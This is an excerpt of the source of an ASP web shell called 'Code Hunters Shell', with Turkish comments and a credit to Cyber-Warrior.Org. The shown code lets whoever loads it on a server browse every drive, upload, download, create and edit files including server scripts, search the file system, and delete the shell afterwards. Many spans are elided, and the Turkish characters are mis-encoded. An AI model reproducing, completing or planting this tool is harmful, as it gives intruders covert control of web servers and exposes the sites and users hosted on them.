...
<%
' ####
' ### Asi Beþiktaþlý Tarafýndan Cyber-Warrior.Org için yazýlmýþtýr. / 14.07.2011
' ####
...
<body>
<br><br><br><br>
<div id="baslik" align="center">Code Hunters Shell # <a href="http://cyber-warrior.org" target="_blank">Cyber-Warrior</a></div><br>
<br>
<%
'Dosya Yolu Urlden Çekiliyor
Path=Replace(Request.QueryString("Path"),"/","\")

'Ana Dizin Shelimizin Bulunduðu Klasöre Ayarlanýyor
Root=Server.Mappath("\")
...
' Dizin Formu yazdýrýlýyor
Response.Write("<div id=""path""><form action=""?islem=git"" method=""post""> Bulunduðunuz Dizin <input type=""text"" name=""path"" size=""90"" value="""&Dizin&"""><input type=""submit"" value=""Git""> <a href=""?islem=Upload&Path="&Path&""">Upload</a> | <a href=""?islem=Search&Path="&Path&""">Dosya Arama</a> | <a href=""?islem=Dosyaindir&Path="&Path&""">Dosya Indir</a>")&vbcrlf

Set Suruculer = FSO.Drives

If Not islem="Drivers" Then
' Serverda ki Mevcut Sürücüler Yazdýrýlýyor
Response.Write "</form> <a href=""?Path="" style=""font-weight:bold"">ROOT(Ana Klasör)</a> || <span id=""drivers""><a href=""?islem=Drivers"">Sürücüler:</a> </span>"
For Each Surucu in Suruculer
    Response.Write ("<a href=""?Path="&Surucu.DriveLetter&":"">"&Surucu.DriveLetter&":\</a> ")&vbcrlf
Next
End If
...
UstKlasorLinki = "<br><a href=""?Path="& UstKlasor.Path &""">< Üst Klasöre Git</a>"
End If

Response.Write(UstKlasorLinki &" <b>"& Klasor.Path &"</b>  | <a href=""?islem=CreateFolder&Path="&Path&""">Klasör Oluþtur</a> | <a href=""?islem=CreateFile"">Dosya Oluþtur</a>" & vbCrLf)
...
For Each Dosya In Dosyalar
    ...
    .Write "<td>"& Int(Dosya.Size / 1024) &" KB</td>" & vbCrlf
...
For Each Surucu in Suruculer
	...
	Response.Write("<tr><td style=""border:solid 1px""><table height=""10"" width="""&(99-int(bosalan/toplamalan*100))&"%"" cellspacing=""0"" cellpadding=""0"" ><tr><td style=""background-color:#0099FF;color:#fff;font-size:10px"">%"&(100-int(bosalan/toplamalan*100))&"</td></tr></table></td></tr>")
...
'---
'	Text, Asp, Php Uzantýlý Yazý Içerikli Dosyalarýn Içeriðini Düzenleyen Sayfa)
	Case "Edit"
		...
		for i = 1 to oFO.FileCount
			...
			Else
				...
				If oFile.UploadSuccessful Then
					...
					Response.Write(" - Dosyanin su an bulunduðu URL:<a href="""&oFile.URLPath&"""><font color=""red"">"&	oFile.URLPath & "</font></a><BR>")
...
Response.Write Server.Mappath("\")&Replace(FileName,"/","\")
...
<center><a href="?islem=ShellDelete"><u>Code Hunters Shelli Serverdan Sil</u></a><br>
